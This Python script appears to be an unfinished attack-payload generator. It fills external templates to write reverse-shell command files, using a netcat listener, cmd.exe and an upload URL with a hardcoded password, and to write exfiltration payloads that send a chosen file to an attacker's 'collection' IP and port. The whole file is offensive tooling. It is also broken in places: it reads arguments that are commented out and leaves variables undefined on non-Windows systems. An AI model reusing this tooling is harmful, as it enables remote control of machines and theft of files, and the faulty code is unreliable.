import argparse
import platform

def main():
    parser = argparse.ArgumentParser(description='Generates payload for desired architecture.')

    #Required arguments
    parser.add_argument('-p', type=str, default=None, help='Desired Payload: exfil', dest='payloadChoice', required=True)
    parser.add_argument('-i', type=str,  default="127.0.0.1", help='collection ip address', dest='collectionIP', required=False)
    parser.add_argument('-r', type=str,  default=1234, help='collection port', dest='collectionPort', required=False)
    #parser.add_argument('-f', type=str,  default=None, help='File you wish to exfil', dest='exfilFile', required=True)
    #parser.add_argument('-a', type=str,  default=None, help='Target architecture: ubuntux86', dest='targetArch', required=True)

    #Optional arguments
    #parser.add_argument('-o', type=str,  default="execute-command.sh", help='Payload output name', dest='payloadName', required=False)

    args = parser.parse_args()

    systemVariables = {'OS': platform.system(),
                        'NCat': 'NCat' if platform.system() == 'Windows' else 'nc',
                        'Shell': ''}

    #Reverse Shell Payload
    if(args.payloadChoice == "RShell"):
        print("Reverse Shell payload generator.")
        shellDestination = "http://localhost:63412/upload?pass=abc321&payload="
        ReverseShell(systemVariables, args.collectionIP, args.collectionPort, shellDestination, "file.cmd")

    #Command Execution Payload
    if(args.payloadChoice == "CExe"):
        print("Execute")

    #File-upload Payload
    if(args.payloadChoice == "upload"):
        print("Upload")

    #File-download Payload
    #The Exfil operation will download a target file from the server.
    if(args.payloadChoice == "exfil" ):
        GenExfil(args.exfilFile, args.collectionIP, args.collectionPort, args.payloadName)
        print("Exfil Payload Generated!")

    #System Information Retrieval Payload
    if(args.payloadChoice == "SysInfo"):
        return

    return

def ReverseShell(systemVariables, collectionIP, collectionPort, shellDestination, payloadName):
    if(systemVariables['OS'] == 'Windows'):
        newShell = "start cmd.exe @cmd /k"
        localNetCat = f'{systemVariables["NCat"]} -l -p {collectionPort}'

    with open('CMDTemplates/RShell', 'r') as file:
        RShellPayloadText = file.read().format(newShell, localNetCat, shellDestination, collectionIP, collectionPort)

    f = open(payloadName, "w")
    f.write(RShellPayloadText)
    f.close()
    return

def GenExfil(exfilFile, collectionIP, collectionPort, payloadName):
    with open('CMDTemplates/Exfil', 'r') as file:
        ExfilPayloadText = file.read().format(exfilFile, collectionIP, collectionPort)
    f = open(payloadName, "w")
    f.write(ExfilPayloadText)
    f.close()
    return

if __name__ == "__main__":
    main()
